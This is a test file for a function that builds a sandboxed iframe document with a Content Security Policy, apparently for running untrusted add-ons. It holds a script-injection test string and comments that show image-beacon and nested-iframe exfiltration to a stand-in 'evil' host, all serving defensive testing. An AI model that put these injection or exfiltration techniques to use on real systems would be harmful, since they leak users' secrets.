// SPDX-FileCopyrightText: 2026 quissicutdeus
//
// SPDX-License-Identifier: AGPL-3.0-or-later

import { describe, it, expect } from 'vitest';
import { srcdocFor } from './srcdoc';

describe('srcdocFor', () => {
  it('produces a document with a root and no allow-same-origin dependency', () => {
    const html = srcdocFor('console.log(1)');
    expect(html).toContain('<div id="app">');
    expect(html).toContain('<script type="module">');
  });

  it('inlines the code directly, not as a data: URL', () => {
    const code = 'export const x = 1;';
    const html = srcdocFor(code);
    expect(html).not.toContain('data:text/javascript');
    expect(html).toContain(`<script type="module">${code}</script>`);
  });

  it('stays within ~5% of the source size, not the ~3x a data: URL would cost', () => {
    const code = 'x'.repeat(10000);
    const html = srcdocFor(code);
    expect(html.length).toBeLessThan(code.length * 1.05 + 1000);
  });

  it('does not let a `</script>` inside the code terminate the outer script', () => {
    const code = 'const s = "</script><script>alert(1)</script>";';
    const html = srcdocFor(code);
    // Two script tags belong to the document itself (the fallback error listener,
    // and the module script). None of the extra closes come from inside the code.
    const scriptCloses = html.match(/<\/script>/g) ?? [];
    expect(scriptCloses).toHaveLength(2);
  });

  /**
   * MICA-24 set `connect-src` and nothing else; MICA-196 put a `default-src 'none'`
   * floor under it, because `connect-src` is not the only way out of the frame. The
   * directive-by-directive reasoning is in `srcdoc.ts` — these assert the policy text.
   */
  describe('the content security policy', () => {
    /** The `content="..."` of the one CSP meta, as the browser would parse it. */
    const policy = (html: string): string[] => {
      const meta = /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/.exec(html);
      if (!meta) throw new Error('no CSP meta in the document');
      return meta[1].split('; ');
    };

    it('blocks outbound fetch entirely when no hosts are given', () => {
      expect(policy(srcdocFor('x'))).toContain("connect-src 'none'");
    });

    it('blocks outbound fetch entirely for an explicitly empty list, same as none', () => {
      expect(policy(srcdocFor('x', []))).toContain("connect-src 'none'");
    });

    it('allows exactly the declared origins, space-separated', () => {
      const html = srcdocFor('x', ['https://api.example.com', 'https://cdn.example.com:8443']);
      expect(policy(html)).toContain(
        'connect-src https://api.example.com https://cdn.example.com:8443'
      );
    });

    it('places the CSP meta before any script tag, so it governs the whole document', () => {
      const html = srcdocFor('x', ['https://api.example.com']);
      expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('<script'));
    });

    /**
     * The floor, and the reason a declared `connect-src` is worth anything: without it an
     * unset `img-src`/`frame-src`/`form-action` is three unpoliced doors beside the one
     * door MICA-24 locked.
     */
    it('refuses everything not named, and shuts every non-connect exit', () => {
      const directives = policy(srcdocFor('x', ['https://api.example.com']));
      expect(directives).toContain("default-src 'none'");
      // A nested `<iframe src="https://evil">` inherits the sandbox but not the CSP —
      // CSP inherits only for local schemes — so the child would run unpoliced.
      expect(directives).toContain("frame-src 'none'");
      // `child-src` is `worker-src`'s fallback as well as `frame-src`'s.
      expect(directives).toContain("child-src 'none'");
      // A form POST is a navigation, which `connect-src` does not govern.
      expect(directives).toContain("form-action 'none'");
      expect(directives).toContain("base-uri 'none'");
    });

    /**
     * `script-src`/`style-src` behave exactly as they did when they were unset. Under a
     * `default-src 'none'` floor that has to be written out, and getting it wrong breaks
     * every add-on at once — the inlined module script would simply never run.
     */
    it('leaves script and style exactly as permissive as an unset directive was', () => {
      const directives = policy(srcdocFor('x'));
      const script = directives.find((d) => d.startsWith('script-src '));
      const style = directives.find((d) => d.startsWith('style-src '));
      expect(script).toBeDefined();
      expect(style).toBeDefined();
      // The inlined module and the fallback error listener are both inline scripts.
      expect(script).toContain("'unsafe-inline'");
      expect(script).toContain("'unsafe-eval'");
      // Svelte injects `<style>` at runtime.
      expect(style).toContain("'unsafe-inline'");
    });

    /**
     * MICA-202: a subresource load is an outbound request like any other. Before this,
     * `img-src https:` left `new Image().src = 'https://evil/?' + secret` open to every
     * add-on regardless of what it declared; `srcdoc.ts` has the audit that found nothing
     * the phone hands an add-on needs it.
     */
    it('scopes images, media and fonts to data:, blob: and the declared hosts', () => {
      const directives = policy(
        srcdocFor('x', ['https://api.example.com', 'https://cdn.example.com:8443'])
      );
      for (const directive of ['img-src', 'media-src', 'font-src']) {
        expect(directives).toContain(
          `${directive} data: blob: https://api.example.com https://cdn.example.com:8443`
        );
      }
    });

    it('lets images, media and fonts load only from data: and blob: when nothing is declared', () => {
      for (const html of [srcdocFor('x'), srcdocFor('x', [])]) {
        const directives = policy(html);
        expect(directives).toContain('img-src data: blob:');
        expect(directives).toContain('media-src data: blob:');
        expect(directives).toContain('font-src data: blob:');
      }
    });

    it('admits no bare scheme that would let a subresource reach an undeclared host', () => {
      const directives = policy(srcdocFor('x', ['https://api.example.com']));
      for (const directive of ['img-src', 'media-src', 'font-src']) {
        const value = directives.find((d) => d.startsWith(`${directive} `));
        expect(value).toBeDefined();
        // `https:` alone is every https host on the internet; `http:` was never here.
        expect(value?.split(' ')).not.toContain('https:');
        expect(value?.split(' ')).not.toContain('http:');
        expect(value?.split(' ')).not.toContain("'self'");
      }
    });

    it('emits exactly one CSP meta, so no directive is silently duplicated', () => {
      const html = srcdocFor('x', ['https://api.example.com']);
      expect(html.match(/http-equiv="Content-Security-Policy"/g)).toHaveLength(1);
    });
  });
});
